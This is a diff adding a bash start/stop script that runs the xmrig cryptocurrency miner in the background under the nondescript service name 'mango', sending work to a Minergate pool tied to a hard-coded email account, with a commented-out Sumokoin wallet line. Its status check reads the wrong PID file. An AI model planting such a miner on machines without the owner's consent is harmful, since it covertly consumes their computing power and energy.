@@ -1,0 +1,30 @@
+#!/bin/bash
+
+case "$1" in
+start)
+   clear
+   xmrig --max-cpu-usage 60 -o xmr.pool.minergate.com:45700 -u adynikez@gmail.com -p x -k &
+   #xmrig --max-cpu-usage 60 -o pool.sumokoin.com:3333 -u SumipBJ7rroF2VmkLaT2KwCL738782k8yMYFwYuU34br65KDBAj6Eg91SXuNxqfB4P3m2pY5Y1ay9YjWpoqszR37PhpeakUndXx1622PaJNSJE -p x -k &
+   echo $!>/var/run/mango.pid
+   ;;
+stop)
+   kill `cat /var/run/mango.pid`
+   rm /var/run/mango.pid
+   ;;
+restart)
+   $0 stop
+   $0 start
+   ;;
+status)
+   if [ -e /var/run/hit.pid ]; then
+      echo mango is running, pid=`cat /var/run/hit.pid`
+   else
+      echo mango is NOT running
+      exit 1
+   fi
+   ;;
+*)
+   echo "Usage: $0 {start|stop|status|restart}"
+esac
+
+exit 0
